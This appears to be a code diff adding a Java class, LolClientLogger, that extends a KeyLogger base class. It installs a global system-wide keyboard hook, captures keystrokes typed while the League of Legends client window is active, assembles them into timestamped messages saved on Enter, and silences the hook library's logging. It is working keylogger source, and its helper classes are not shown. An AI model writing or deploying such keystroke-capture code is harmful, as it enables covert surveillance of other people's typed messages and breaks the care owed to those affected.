@@ -1,0 +1,61 @@
+package logger;
+
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.keyboard.NativeKeyListener;
+
+import java.io.IOException;
+import java.util.logging.Level;
+import java.util.logging.Logger;
+
+public class LolClientLogger extends KeyLogger implements NativeKeyListener {
+
+    private static LolClientLogger ourInstance = new LolClientLogger();
+
+    private LolClientLogger() {
+        super.message = "From: LoL-Client || At: " + getCurrentTime() + "|| Message: ";
+        super.sendKey = "Enter";
+    }
+
+    public static LolClientLogger getInstance() {
+        return ourInstance;
+    }
+
+    @Override
+    public void nativeKeyPressed(NativeKeyEvent e) {
+        if (accessWindow.getActiveWindowTitle().equals(Globals.lolClient)) {
+            if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals(sendKey)) {
+                try {
+                    System.out.println(fileName);
+                    saveMessage();
+                } catch (IOException e1) {
+                    e1.printStackTrace();
+                }
+            }
+        }
+        if(!NativeKeyEvent.getKeyText(e.getKeyCode()).equals(sendKey)) {
+            if (accessWindow.getActiveWindowTitle().equals(Globals.lolClient)) {
+                if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Space")) {
+                    message = message + " ";
+                } else if(NativeKeyEvent.getKeyText(e.getKeyCode()).length() < 2) {
+                    message = message + NativeKeyEvent.getKeyText(e.getKeyCode());
+                }
+            }
+        }
+    }
+
+    @Override
+    public void turnOn() {
+        try {
+            GlobalScreen.registerNativeHook();
+        } catch (NativeHookException ex) {
+            System.err.println("There was a problem registering the native hook.");
+            System.err.println(ex.getMessage());
+            System.exit(1);
+        }
+        GlobalScreen.addNativeKeyListener(getInstance());
+        java.util.logging.Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
+        logger.setLevel(Level.OFF);
+    }
+}
